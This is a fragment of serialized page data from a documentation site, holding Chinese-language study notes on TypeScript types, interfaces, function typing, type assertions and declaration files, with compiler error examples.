泛型",slug:"类型断言-vs-泛型",normalizedTitle:"类型断言 vs 泛型",charIndex:17984},{level:2,title:"声明文件",slug:"声明文件",normalizedTitle:"声明文件",charIndex:18501},{level:3,title:"新语法",slug:"新语法",normalizedTitle:"新语法",charIndex:18556}],headersStr:"类型声明 原始数据类型 任意值 自动类型判断 联合类型 对象的类型——接口 可选属性 任意属性 数组的类型 「类型 + 方括号」表示法§ 数组泛型 用接口表示数组 类数组 any 在数组中的应用 函数的类型 函数声明 函数表达式 用接口定义函数的形状 可选参数 参数默认值 剩余参数 重载 类型断言 语法 类型断言的用途 类型断言的限制 双重断言 类型断言 vs 类型转换 类型断言 vs 类型声明 类型断言 vs 泛型 声明文件 新语法",content:"# 类型声明\n\n * 类型声明是TS非常重要的一个特点；\n\n * 通过类型声明可以指定TS中变量（参数、形参）的类型；\n\n * 指定类型后，当为变量赋值时，TS编译器会自动检查值是否符合类型声明，符合则赋值，否则报错；\n\n * 简而言之，类型声明给变量设置了类型，使得变量只能存储某种类型的值；\n\n * 语法：\n   \n   * let 变量: 类型;\n     \n     let 变量: 类型 = 值;\n     \n     function fn(参数: 类型, 参数: 类型): 类型{\n         ...\n     }\n     \n\n\n# 原始数据类型\n\n> JavaScript 的类型分为两种：原始数据类型（Primitive data types）和对象类型（Object types）。\n\n * 原始数据类型包括：布尔值、数值、字符串、null、undefined 以及 ES6 中的新类型 Symbol 和 ES10 中的新类型 BigInt。\n\n * 类型：\n\n类型        例子               描述\nnumber    1, -33, 2.5      任意数字\nstring    'hi', \"hi\", hi   任意字符串\nboolean   true、false       布尔值true或false\n字面量       其本身              限制变量的值就是该字面量的值\nany       *                任意类型\nunknown   *                类型安全的any\nvoid      空值（undefined）    没有值（或undefined）\nnever     没有值              不能是任何值\nobject    {name:'孙悟空'}     任意的JS对象\narray     [1,2,3]          任意JS数组\ntuple     [4,5]            元素，TS新增类型，固定长度数组\nenum      enum{A, B}       枚举，TS中新增类型\n\n * number\n   \n    let decimal: number = 6;\n    let hex: number = 0xf00d;\n    let binary: number = 0b1010;\n    let octal: number = 0o744;\n    let big: bigint = 100n;\n   \n    let notANumber: number = NaN;\n    let infinityNumber: number = Infinity;\n   \n\n * boolean\n   \n     let isDone: boolean = false;\n   \n     let createdByBoolean: boolean = Boolean(1);\n   \n   \n\n * string\n   \n     let color: string = \"blue\";\n     color = 'red';\n     \n     let fullName: string = `Bob Bobbington`;\n     let age: number = 37;\n     let sentence: string = `Hello, my name is ${fullName}.\n     \n     I'll be ${age + 1} years old next month.`;\n   \n\n * 字面量\n   \n   * 也可以使用字面量去指定变量的类型，通过字面量可以确定变量的取值范围\n   \n   let color: 'red' | 'blue' | 'black';\n   let num: 1 | 2 | 3 | 4 | 5;\n   \n   \n   * void\n   \n   JavaScript 没有空值（Void）的概念，在 TypeScript 中，可以用 void 表示没有任何返回值的函数：\n   \n   let unusable: void = undefined;\n   \n   function alertName(): void {\n     alert('My name is Tom');\n   }\n   \n\n * Null 和 Undefined 在 TypeScript 中，可以使用 null 和 undefined 来定义这两个原始数据类型：\n   \n   let u: undefined = undefined;\n   let n: null = null;\n   与 void 的区别是，undefined 和 null 是所有类型的子类型。也就是说 undefined 类型的变量，可以赋值给 number 类型的变量：\n   \n   // 这样不会报错\n   let num: number = undefined;\n   // 这样也不会报错\n   let u: undefined;\n   let num: number = u;\n   而 void 类型的变量不能赋值给 number 类型的变量：\n   \n   let u: void;\n   let num: number = u;\n   \n   // Type 'void' is not assignable to type 'number'.\n   \n\n\n# 任意值\n\n> 任意值（Any）用来表示允许赋值为任意类型。 个人理解和普通js一样。\n\n * any\n   \n   let d: any = 4;\n   d = 'hello';\n   d = true;\n   \n   \x3c!-- 也允许调用任何方法： --\x3e\n   \n   let anyThing: any = 'Tom';\n   anyThing.setName('Jerry');\n   anyThing.setName('Jerry').sayHello();\n   anyThing.myName.setFirstName('Cat');\n   \n   \n   \n   未声明类型的变量\n   \n   变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型：\n   \n   let something;\n   something = 'seven';\n   something = 7;\n   \n   something.setName('Tom');\n   \n   \x3c!-- 等价于 --\x3e\n   \n   let something: any;\n   something = 'seven';\n   something = 7;\n   \n   something.setName('Tom');\n   \n\n\n# 自动类型判断\n\n * TS拥有自动的类型判断机制\n * 当对变量的声明和赋值是同时进行的，TS编译器会自动判断变量的类型\n * 所以如果你的变量的声明和赋值时同时进行的，可以省略掉类型声明\n\n以下代码虽然没有指定类型，但是会在编译的时候报错：\n\n\nlet myFavoriteNumber = 'seven';\nmyFavoriteNumber = 7;\n\n// index.ts(2,1): error TS2322: Type 'number' is not assignable to type 'string'.\n\n// 事实上，它等价于：\n\nlet myFavoriteNumber: string = 'seven';\nmyFavoriteNumber = 7;\n\n// index.ts(2,1): error TS2322: Type 'number' is not assignable to type 'string'.\n\n\n如果定义的时候没有赋值，不管之后有没有赋值，都会被推断成 any 类型而完全不被类型检查：\n\nlet myFavoriteNumber;\nmyFavoriteNumber = 'seven';\nmyFavoriteNumber = 7;\n\n\n\n\n# 联合类型\n\n联合类型（Union Types）表示取值可以为多种类型中的一种。\n\nlet myFavoriteNumber: string | number;\nmyFavoriteNumber = 'seven';\nmyFavoriteNumber = 7;\n\n\nlet myFavoriteNumber: string | number;\nmyFavoriteNumber = true;\n\n// index.ts(2,1): error TS2322: Type 'boolean' is not assignable to type 'string | number'.\n//   Type 'boolean' is not assignable to type 'number'.\n\n\n联合类型使用 | 分隔每个类型。\n\n这里的 let myFavoriteNumber: string | number 的含义是，允许 myFavoriteNumber 的类型是 string 或者 number，但是不能是其他类型。\n\n\n# 对象的类型——接口\n\n> 在 TypeScript 中，我们使用接口（Interfaces）来定义对象的类型。\n\n在面向对象语言中，接口（Interfaces）是一个很重要的概念，它是对行为的抽象，而具体如何行动需要由类（classes）去实现（implement）。\n\ninterface Person {\n    name: string;\n    age: number;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    age: 25\n};\n\n\n上面的例子中，我们定义了一个接口 Person，接着定义了一个变量 tom，它的类型是 Person。这样，我们就约束了 tom 的形状必须和接口 Person 一致。\n\n接口一般首字母大写。有的编程语言中会建议接口的名称加上 I 前缀。\n\n定义的变量比接口少了一些属性是不允许的：\n\n\ninterface Person {\n    name: string;\n    age: number;\n}\n\nlet tom: Person = {\n    name: 'Tom'\n};\n\n// index.ts(6,5): error TS2322: Type '{ name: string; }' is not assignable to type 'Person'.\n//   Property 'age' is missing in type '{ name: string; }'.\n\n\n\n多一些属性也是不允许的：\n\ninterface Person {\n    name: string;\n    age: number;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    age: 25,\n    gender: 'male'\n};\n\n// index.ts(9,5): error TS2322: Type '{ name: string; age: number; gender: string; }' is not assignable to type 'Person'.\n//   Object literal may only specify known properties, and 'gender' does not exist in type 'Person'.\n\n\n\n# 可选属性\n\n> 有时我们希望不要完全匹配一个形状，那么可以用可选属性：\n\ninterface Person {\n    name: string;\n    age?: number;\n}\n\nlet tom: Person = {\n    name: 'Tom'\n};\nlet tom: Person = {\n    name: 'Tom',\n    age: 25\n};\n// 可选属性的含义是该属性可以不存在。\n\n\n\n这时仍然不允许添加未定义的属性：\n\n  interface Person {\n      name: string;\n      age?: number;\n  }\n\n  let tom: Person = {\n      name: 'Tom',\n      age: 25,\n      gender: 'male'\n  };\n\n  // examples/playground/index.ts(9,5): error TS2322: Type '{ name: string; age: number; gender: string; }' is not assignable to type 'Person'.\n  //   Object literal may only specify known properties, and 'gender' does not exist in type 'Person'.\n\n\n\n# 任意属性\n\n有时候我们希望一个接口允许有任意的属性，可以使用如下方式：\n\ninterface Person {\n    name: string;\n    age?: number;\n    [propName: string]: any;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    gender: 'male'\n};\n\n\n使用 [propName: string] 定义了任意属性取 string 类型的值。\n\n需要注意的是，一旦定义了任意属性，那么确定属性和可选属性的类型都必须是它的类型的子集：\n\n\ninterface Person {\n    name: string;\n    age?: number;\n    [propName: string]: string;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    age: 25,\n    gender: 'male'\n};\n\n// index.ts(3,5): error TS2411: Property 'age' of type 'number' is not assignable to string index type 'string'.\n// index.ts(7,5): error TS2322: Type '{ [x: string]: string | number; name: string; age: number; gender: string; }' is not assignable to type 'Person'.\n//   Index signatures are incompatible.\n//     Type 'string | number' is not assignable to type 'string'.\n//       Type 'number' is not assignable to type 'string'.\n// 上例中，任意属性的值允许是 string，但是可选属性 age 的值却是 number，number 不是 string 的子属性，所以报错了。\n\n// 另外，在报错信息中可以看出，此时 { name: 'Tom', age: 25, gender: 'male' } 的类型被推断成了 { [x: string]: string | number; name: string; age: number; gender: string; }，这是联合类型和接口的结合。\n\n\n\n一个接口中只能定义一个任意属性。如果接口中有多个类型的属性，则可以在任意属性中使用联合类型：\n\ninterface Person {\n    name: string;\n    age?: number;\n    [propName: string]: string | number;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    age: 25,\n    gender: 'male'\n};\n\n\n\n有时候我们希望对象中的一些字段只能在创建的时候被赋值，那么可以用 readonly 定义只读属性：\n\n\ninterface Person {\n    readonly id: number;\n    name: string;\n    age?: number;\n    [propName: string]: any;\n}\n\nlet tom: Person = {\n    id: 89757,\n    name: 'Tom',\n    gender: 'male'\n};\n\ntom.id = 9527;\n\n// index.ts(14,5): error TS2540: Cannot assign to 'id' because it is a constant or a read-only property.\n\n\n上例中，使用 readonly 定义的属性 id 初始化后，又被赋值了，所以报错了。\n\n注意，只读的约束存在于第一次给对象赋值的时候，而不是第一次给只读属性赋值的时候：\n\ninterface Person {\n    readonly id: number;\n    name: string;\n    age?: number;\n    [propName: string]: any;\n}\n\nlet tom: Person = {\n    name: 'Tom',\n    gender: 'male'\n};\n\ntom.id = 89757;\n\n// index.ts(8,5): error TS2322: Type '{ name: string; gender: string; }' is not assignable to type 'Person'.\n//   Property 'id' is missing in type '{ name: string; gender: string; }'.\n// index.ts(13,5): error TS2540: Cannot assign to 'id' because it is a constant or a read-only property.\n\n\n上例中，报错信息有两处，第一处是在对 tom 进行赋值的时候，没有给 id 赋值。\n\n第二处是在给 tom.id 赋值的时候，由于它是只读属性，所以报错了。\n\n\n# 数组的类型\n\n\n# 「类型 + 方括号」表示法§\n\n最简单的方法是使用「类型 + 方括号」来表示数组：\n\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];\n\n// 数组的项中不允许出现其他的类型：\n\nlet fibonacci: number[] = [1, '1', 2, 3, 5]; // Type 'string' is not assignable to type 'number'.\n\n\n\n\n数组的一些方法的参数也会根据数组在定义时约定的类型进行限制：\n\nlet fibonacci: number[] = [1, 1, 2, 3, 5];\nfibonacci.push('8');\n\n// Argument of type '\"8\"' is not assignable to parameter of type 'number'.\n// 上例中，push 方法只允许传入 number 类型的参数，但是却传了一个 \"8\" 类型的参数，所以报错了\n\n\n\n# 数组泛型\n\n我们也可以使用数组泛型（Array Generic） Array<elemType> 来表示数组：\n\nlet fibonacci: Array<number> = [1, 1, 2, 3, 5];\n\n\n\n# 用接口表示数组\n\n接口也可以用来描述数组：\n\ninterface NumberArray {\n    [index: number]: number;\n}\nlet fibonacci: NumberArray = [1, 1, 2, 3, 5];\n\n\nNumberArray 表示：只要索引的类型是数字时，那么值的类型必须是数字。\n\n虽然接口也可以用来描述数组，但是我们一般不会这么做，因为这种方式比前两种方式复杂多了。\n\n不过有一种情况例外，那就是它常用来表示类数组。\n\n\n# 类数组\n\n类数组（Array-like Object）不是数组类型，比如 arguments：\n\nfunction sum() {\n    let args: number[] = arguments;\n}\n\n// Type 'IArguments' is missing the following properties from type 'number[]': pop, push, concat, join, and 24 more.\n\n\n上例中，arguments 实际上是一个类数组，不能用普通的数组的方式来描述，而应该用接口：\n\nfunction sum() {\n    let args: {\n        [index: number]: number;\n        length: number;\n        callee: Function;\n    } = arguments;\n}\n\n\n> 在这个例子中，我们除了约束当索引的类型是数字时，值的类型必须是数字之外，也约束了它还有 length 和 callee 两个属性。\n\n事实上常用的类数组都有自己的接口定义，如 IArguments, NodeList, HTMLCollection 等：\n\nfunction sum() {\n    let args: IArguments = arguments;\n}\n\n\n其中 IArguments 是 TypeScript 中定义好了的类型，它实际上就是：\n\ninterface IArguments {\n    [index: number]: any;\n    length: number;\n    callee: Function;\n}\n\n\n\n# any 在数组中的应用\n\n一个比较常见的做法是，用 any 表示数组中允许出现任意类型：\n\nlet list: any[] = ['xcatliu', 25, { website: 'http://xcatliu.com' }];\n\n\n\n\n# 函数的类型\n\n\n# 函数声明\n\n在 JavaScript 中，有两种常见的定义函数的方式——函数声明（Function Declaration）和函数表达式（Function Expression）：\n\n// 函数声明（Function Declaration）\nfunction sum(x, y) {\n    return x + y;\n}\n\n// 函数表达式（Function Expression）\nlet mySum = function (x, y) {\n    return x + y;\n};\n\n\n一个函数有输入和输出，要在 TypeScript 中对其进行约束，需要把输入和输出都考虑到，其中函数声明的类型定义较简单：\n\n\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\n\n\n注意，输入多余的（或者少于要求的）参数，是不被允许的：\n\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\nsum(1, 2, 3);\n\n// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target.\nfunction sum(x: number, y: number): number {\n    return x + y;\n}\nsum(1);\n\n// index.ts(4,1): error TS2346: Supplied parameters do not match any signature of call target.\n\n\n\n# 函数表达式\n\n如果要我们现在写一个对函数表达式（Function Expression）的定义，可能会写成这样：\n\nlet mySum = function (x: number, y: number): number {\n    return x + y;\n};\n\n\n这是可以通过编译的，不过事实上，上面的代码只对等号右侧的匿名函数进行了类型定义，而等号左边的 mySum，是通过赋值操作进行类型推论而推断出来的。如果需要我们手动给 mySum 添加类型，则应该是这样：\n\nlet mySum: (x: number, y: number) => number = function (x: number, y: number): number {\n  return x + y;\n};\n}\n\n\n\n\n# 用接口定义函数的形状\n\n我们也可以使用接口的方式来定义一个函数需要符合的形状：\n\ninterface SearchFunc {\n    (source: string, subString: string): boolean;\n}\n\nlet mySearch: SearchFunc;\nmySearch = function(source: string, subString: string) {\n    return source.search(subString) !== -1;\n}\n\n\n采用函数表达式|接口定义函数的方式时，对等号左侧进行类型限制，可以保证以后对函数名赋值时保证参数个数、参数类型、返回值类型不变。\n\n\n# 可选参数\n\n前面提到，输入多余的（或者少于要求的）参数，是不允许的。那么如何定义可选的参数呢？\n\n与接口中的可选属性类似，我们用 ? 表示可选的参数：\n\n\nfunction buildName(firstName: string, lastName?: string) {\n    if (lastName) {\n        return firstName + ' ' + lastName;\n    } else {\n        return firstName;\n    }\n}\nlet tomcat = buildName('Tom', 'Cat');\nlet tom = buildName('Tom');\n\n\n需要注意的是，可选参数必须接在必需参数后面。换句话说，可选参数后面不允许再出现必需参数了\n\nfunction buildName(firstName?: string, lastName: string) {\n    if (firstName) {\n        return firstName + ' ' + lastName;\n    } else {\n        return lastName;\n    }\n}\nlet tomcat = buildName('Tom', 'Cat');\nlet tom = buildName(undefined, 'Tom');\n\n// index.ts(1,40): error TS1016: A required parameter cannot follow an optional parameter.\n\n\n\n\n# 参数默认值\n\n在 ES6 中，我们允许给函数的参数添加默认值，TypeScript 会将添加了默认值的参数识别为可选参数\n\nfunction buildName(firstName: string, lastName: string = 'Cat') {\n    return firstName + ' ' + lastName;\n}\nlet tomcat = buildName('Tom', 'Cat');\nlet tom = buildName('Tom');\n// 此时就不受「可选参数必须接在必需参数后面」的限制了：\nfunction buildName(firstName: string = 'Tom', lastName: string) {\n    return firstName + ' ' + lastName;\n}\nlet tomcat = buildName('Tom', 'Cat');\nlet cat = buildName(undefined, 'Cat');\n\n\n\n\n# 剩余参数\n\nES6 中，可以使用 ...rest 的方式获取函数中的剩余参数（rest 参数）：\n\nfunction push(array, ...items) {\n    items.forEach(function(item) {\n        array.push(item);\n    });\n}\n\nlet a: any[] = [];\npush(a, 1, 2, 3);\n\n\n事实上，items 是一个数组。所以我们可以用数组的类型来定义它：\n\nfunction push(array: any[], ...items: any[]) {\n    items.forEach(function(item) {\n        array.push(item);\n    });\n}\nlet a = [];\npush(a, 1, 2, 3);\n\n\n\n\n# 重载\n\n重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。\n\n比如，我们需要实现一个函数 reverse，输入数字 123 的时候，输出反转的数字 321，输入字符串 'hello' 的时候，输出反转的字符串 'olleh'。\n\n利用联合类型，我们可以这么实现：\n\nfunction reverse(x: number | string): number | string | void {\n    if (typeof x === 'number') {\n        return Number(x.toString().split('').reverse().join(''));\n    } else if (typeof x === 'string') {\n        return x.split('').reverse().join('');\n    }\n}\n\n\n然而这样有一个缺点，就是不能够精确的表达，输入为数字的时候，输出也应该为数字，输入为字符串的时候，输出也应该为字符串。\n\n这时，我们可以使用重载定义多个 reverse 的函数类型：\n\nfunction reverse(x: number): number;\nfunction reverse(x: string): string;\nfunction reverse(x: number | string): number | string | void {\n    if (typeof x === 'number') {\n        return Number(x.toString().split('').reverse().join(''));\n    } else if (typeof x === 'string') {\n        return x.split('').reverse().join('');\n    }\n}\n\n\n\n# 类型断言\n\n> 有些情况下，变量的类型对于我们来说是很明确，但是TS编译器却并不清楚，此时，可以通过类型断言来告诉编译器变量的类型，断言有两种形式：\n\n\n# 语法\n\n * 第一种 值 as 类型\n\n  let someValue: unknown = \"this is a string\";\n  let strLength: number = (someValue as string).length;\n\n\n * 第二种 <类型>值\n\nlet someValue: unknown = \"this is a string\";\nlet strLength: number = (<string>someValue).length;\n\n\n> 在 tsx 语法（React 的 jsx 语法的 ts 版）中必须使用前者，即 值 as 类型。\n\n形如 <Foo> 的语法在 tsx 中表示的是一个 ReactNode，在 ts 中除了表示类型断言之外，也可能是表示一个泛型。\n\n\n# 类型断言的用途\n\n将一个联合类型断言为其中一个类型\n\n> TypeScript 不确定一个联合类型的变量到底是哪个类型的时候，我们只能访问此联合类型的所有类型中共有的属性或方法\n\n\n# 类型断言的限制\n\n> 当前断言总结\n\n * 联合类型可以被断言为其中一个类型\n * 父类可以被断言为子类\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型\n\n类型断言的限制：\n\ninterface Animal {\n    name: string;\n}\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nlet tom: Cat = {\n    name: 'Tom',\n    run: () => { console.log('run') }\n};\nlet animal: Animal = tom;\n\n\n我们知道，TypeScript 是结构类型系统，类型之间的对比只会比较它们最终的结构，而会忽略它们定义时的关系。\n\n在上面的例子中，Cat 包含了 Animal 中的所有属性，除此之外，它还有一个额外的方法 run。TypeScript 并不关心 Cat 和 Animal 之间定义时是什么关系，而只会看它们最终的结构有什么关系——所以它与 Cat extends Animal 是等价的：\n\ninterface Animal {\n    name: string;\n}\ninterface Cat extends Animal {\n    run(): void;\n}\n\n\n那么也不难理解为什么 Cat 类型的 tom 可以赋值给 Animal 类型的 animal 了——就像面向对象编程中我们可以将子类的实例赋值给类型为父类的变量。\n\n我们把它换成 TypeScript 中更专业的说法，即：Animal 兼容 Cat。\n\n当 Animal 兼容 Cat 时，它们就可以互相进行类型断言了：\n\ninterface Animal {\n    name: string;\n}\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nfunction testAnimal(animal: Animal) {\n    return (animal as Cat);\n}\nfunction testCat(cat: Cat) {\n    return (cat as Animal);\n}\n\n\n这样的设计其实也很容易就能理解：\n\n * 允许 animal as Cat 是因为「父类可以被断言为子类」，这个前面已经学习过了\n * 允许 cat as Animal 是因为既然子类拥有父类的属性和方法，那么被断言为父类，获取父类的属性、调用父类的方法，就不会有任何问题，故「子类可以被断言为父类」 需要注意的是，这里我们使用了简化的父类子类的关系来表达类型的兼容性，而实际上 TypeScript 在判断类型的兼容性时，比这种情况复杂很多，详细请参考[类型的兼容性（TODO)][]章节。\n\n总之，若 A 兼容 B，那么 A 能够被断言为 B，B 也能被断言为 A。\n\n同理，若 B 兼容 A，那么 A 能够被断言为 B，B 也能被断言为 A。\n\n所以这也可以换一种说法：\n\n要使得 A 能够被断言为 B，只需要 A 兼容 B 或 B 兼容 A 即可，这也是为了在类型断言时的安全考虑，毕竟毫无根据的断言是非常危险的。\n\n综上所述：\n\n * 联合类型可以被断言为其中一个类型\n * 父类可以被断言为子类\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型\n * 要使得 A 能够被断言为 B，只需要 A 兼容 B 或 B 兼容 A 即可 其实前四种情况都是最后一个的特例。\n\n\n# 双重断言\n\n既然：\n\n * 任何类型都可以被断言为 any\n * any 可以被断言为任何类型 那么我们是不是可以使用双重断言 as any as Foo 来将任何一个类型断言为任何另一个类型呢？\n\ninterface Cat {\n    run(): void;\n}\ninterface Fish {\n    swim(): void;\n}\n\nfunction testCat(cat: Cat) {\n    return (cat as any as Fish);\n}\n\n\n在上面的例子中，若直接使用 cat as Fish 肯定会报错，因为 Cat 和 Fish 互相都不兼容。\n\n但是若使用双重断言，则可以打破「要使得 A 能够被断言为 B，只需要 A 兼容 B 或 B 兼容 A 即可」的限制，将任何一个类型断言为任何另一个类型。\n\n若你使用了这种双重断言，那么十有八九是非常错误的，它很可能会导致运行时错误。\n\n除非迫不得已，千万别用双重断言\n\n\n# 类型断言 vs 类型转换\n\n> 类型断言只会影响 TypeScript 编译时的类型，类型断言语句在编译结果中会被删除：\n\n\n类型断言只会影响 TypeScript 编译时的类型，类型断言语句在编译结果中会被删除：\n\nfunction toBoolean(something: any): boolean {\n    return something as boolean;\n}\n\ntoBoolean(1);\n// 返回值为 1\n在上面的例子中，将 something 断言为 boolean 虽然可以通过编译，但是并没有什么用，代码在编译后会变成：\n\nfunction toBoolean(something) {\n    return something;\n}\n\ntoBoolean(1);\n// 返回值为 1\n所以类型断言不是类型转换，它不会真的影响到变量的类型。\n\n若要进行类型转换，需要直接调用类型转换的方法：\n\nfunction toBoolean(something: any): boolean {\n    return Boolean(something);\n}\n\ntoBoolean(1);\n// 返回值为 true\n\n\n\n# 类型断言 vs 类型声明\n\n在这个例子中：\n\nfunction getCacheData(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getCacheData('tom') as Cat;\ntom.run();\n\n\n我们使用 as Cat 将 any 类型断言为了 Cat 类型。\n\n但实际上还有其他方式可以解决这个问题：\n\nfunction getCacheData(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst tom: Cat = getCacheData('tom');\ntom.run();\n\n\n上面的例子中，我们通过类型声明的方式，将 tom 声明为 Cat，然后再将 any 类型的 getCacheData('tom') 赋值给 Cat 类型的 tom。\n\n这和类型断言是非常相似的，而且产生的结果也几乎是一样的——tom 在接下来的代码中都变成了 Cat 类型。\n\n它们的区别，可以通过这个例子来理解：\n\ninterface Animal {\n    name: string;\n}\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst animal: Animal = {\n    name: 'tom'\n};\nlet tom = animal as Cat;\n\n\n在上面的例子中，由于 Animal 兼容 Cat，故可以将 animal 断言为 Cat 赋值给 tom。\n\n但是若直接声明 tom 为 Cat 类型：\n\ninterface Animal {\n    name: string;\n}\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst animal: Animal = {\n    name: 'tom'\n};\nlet tom: Cat = animal;\n\n// index.ts:12:5 - error TS2741: Property 'run' is missing in type 'Animal' but required in type 'Cat'.\n\n\n则会报错，不允许将 animal 赋值为 Cat 类型的 tom。\n\n这很容易理解，Animal 可以看作是 Cat 的父类，当然不能将父类的实例赋值给类型为子类的变量。\n\n深入的讲，它们的核心区别就在于：\n\n * animal 断言为 Cat，只需要满足 Animal 兼容 Cat 或 Cat 兼容 Animal 即可\n * animal 赋值给 tom，需要满足 Cat 兼容 Animal 才行 但是 Cat 并不兼容 Animal。\n\n而在前一个例子中，由于 getCacheData('tom') 是 any 类型，any 兼容 Cat，Cat 也兼容 any，故\n\nconst tom = getCacheData('tom') as Cat;\n// 等价于\nconst tom: Cat = getCacheData('tom');\n\n\n知道了它们的核心区别，就知道了类型声明是比类型断言更加严格的。\n\n所以为了增加代码的质量，我们最好优先使用类型声明，这也比类型断言的 as 语法更加优雅。\n\n\n# 类型断言 vs 泛型\n\nfunction getCacheData(key: string): any {\n    return (window as any).cache[key];\n}\n\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getCacheData('tom') as Cat;\ntom.run();\n\n\n我们还有第三种方式可以解决这个问题，那就是泛型：\n\nfunction getCacheData<T>(key: string): T {\n    return (window as any).cache[key];\n}\n\ninterface Cat {\n    name: string;\n    run(): void;\n}\n\nconst tom = getCacheData<Cat>('tom');\ntom.run();\n\n\n\n通过给 getCacheData 函数添加了一个泛型 <T>，我们可以更加规范的实现对 getCacheData 返回值的约束，这也同时去除掉了代码中的 any，是最优的一个解决方案。\n\n\n# 声明文件\n\n> 当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能。\n\n\n# 新语法\n\n * declare var 声明全局变量\n * eclare function 声明全局方法\n * eclare class 声明全局类\n * eclare enum 声明全局枚举类型\n * eclare namespace 声明（含有子属性的）全局对象\n * nterface 和 type 声明全局类型\n * xport 导出变量\n * xport namespace 导出（含有子属性的）对象\n * xport default ES6 默认导出\n * xport = commonjs 导出模块\n * xport as namespace UMD 库声明全局变量\n * eclare global 扩展全局变量\n * eclare module 扩展模块\n * // 三斜线指令\n\n * unknown\n   \n   let notSure: unknown = 4;\n   notSure = 'hello';\n   \n\n * never\n   \n   function error(message: string): never {\n    throw new Error(message);\n   }\n   \n\n * object（没啥用）\n   \n   let obj: object = {};\n   \n\n * array\n   \n   let list: number[] = [1, 2, 3];\n   let list: Array<number> = [1, 2, 3];\n   \n\n * tuple\n   \n   let x: [string, number];\n   x = [\"hello\", 10]; \n   \n\n * enum\n   \n   enum Color {\n    Red,\n    Green,\n    Blue,\n   }\n   let c: Color = Color.Green;\n   \n   enum Color {\n    Red = 1,\n    Green,\n    Blue,\n   }\n   let c: Color = Color.Green;\n   \n   enum Color {\n    Red = 1,\n    Green = 2,\n    Blue = 4,\n   }\n   let c: Color = Color.Green;\n   ",normalizedContent:"# 类型声明\n\n * 类型声明是ts非常重要的一个特点；\n\n * 通过类型声明可以指定ts中变量（参数、形参）的类型；\n\n * 指定类型后，当为变量赋值时，ts编译器会自动检查值是否符合类型声明，符合则赋值，否则报错；\n\n * 简而言之，类型声明给变量设置了类型，使得变量只能存储某种类型的值；\n\n * 语法：\n   \n   * let 变量: 类型;\n     \n     let 变量: 类型 = 值;\n     \n     function fn(参数: 类型, 参数: 类型): 类型{\n         ...\n     }\n     \n\n\n# 原始数据类型\n\n> javascript 的类型分为两种：原始数据类型（primitive data types）和对象类型（object types）。\n\n * 原始数据类型包括：布尔值、数值、字符串、null、undefined 以及 es6 中的新类型 symbol 和 es10 中的新类型 bigint。\n\n * 类型：\n\n类型        例子               描述\nnumber    1, -33, 2.5      任意数字\nstring    'hi', \"hi\", hi   任意字符串\nboolean   true、false       布尔值true或false\n字面量       其本身              限制变量的值就是该字面量的值\nany       *                任意类型\nunknown   *                类型安全的any\nvoid      空值（undefined）    没有值（或undefined）\nnever     没有值              不能是任何值\nobject    {name:'孙悟空'}     任意的js对象\narray     [1,2,3]          任意js数组\ntuple     [4,5]            元素，ts新增类型，固定长度数组\nenum      enum{a, b}       枚举，ts中新增类型\n\n * number\n   \n    let decimal: number = 6;\n    let hex: number = 0xf00d;\n    let binary: number = 0b1010;\n    let octal: number = 0o744;\n    let big: bigint = 100n;\n   \n    let notanumber: number = nan;\n    let infinitynumber: number = infinity;\n   \n\n * boolean\n   \n     let isdone: boolean = false;\n   \n     let createdbyboolean: boolean = boolean(1);\n   \n   \n\n * string\n   \n     let color: string = \"blue\";\n     color = 'red';\n     \n     let fullname: string = `bob bobbington`;\n     let age: number = 37;\n     let sentence: string = `hello, my name is ${fullname}.\n     \n     i'll be ${age + 1} years old next month.`;\n   \n\n * 字面量\n   \n   * 也可以使用字面量去指定变量的类型，通过字面量可以确定变量的取值范围\n   \n   let color: 'red' | 'blue' | 'black';\n   let num: 1 | 2 | 3 | 4 | 5;\n   \n   \n   * void\n   \n   javascript 没有空值（void）的概念，在 typescript 中，可以用 void 表示没有任何返回值的函数：\n   \n   let unusable: void = undefined;\n   \n   function alertname(): void {\n     alert('my name is tom');\n   }\n   \n\n * null 和 undefined 在 typescript 中，可以使用 null 和 undefined 来定义这两个原始数据类型：\n   \n   let u: undefined = undefined;\n   let n: null = null;\n   与 void 的区别是，undefined 和 null 是所有类型的子类型。也就是说 undefined 类型的变量，可以赋值给 number 类型的变量：\n   \n   // 这样不会报错\n   let num: number = undefined;\n   // 这样也不会报错\n   let u: undefined;\n   let num: number = u;\n   而 void 类型的变量不能赋值给 number 类型的变量：\n   \n   let u: void;\n   let num: number = u;\n   \n   // type 'void' is not assignable to type 'number'.\n   \n\n\n# 任意值\n\n> 任意值（any）用来表示允许赋值为任意类型。 个人理解和普通js一样。\n\n * any\n   \n   let d: any = 4;\n   d = 'hello';\n   d = true;\n   \n   \x3c!-- 也允许调用任何方法： --\x3e\n   \n   let anything: any = 'tom';\n   anything.setname('jerry');\n   anything.setname('jerry').sayhello();\n   anything.myname.setfirstname('cat');\n   \n   \n   \n   未声明类型的变量\n   \n   变量如果在声明的时候，未指定其类型，那么它会被识别为任意值类型：\n   \n   let something;\n   something = 'seven';\n   something = 7;\n   \n   something.setname('tom');\n   \n   \x3c!-- 等价于 --\x3e\n   \n   let something: any;\n   something = 'seven';\n   something = 7;\n   \n   something.setname('tom');\n   \n\n\n# 自动类型判断\n\n * ts拥有自动的类型判断机制\n * 当对变量的声明和赋值是同时进行的，ts编译器会自动判断变量的类型\n * 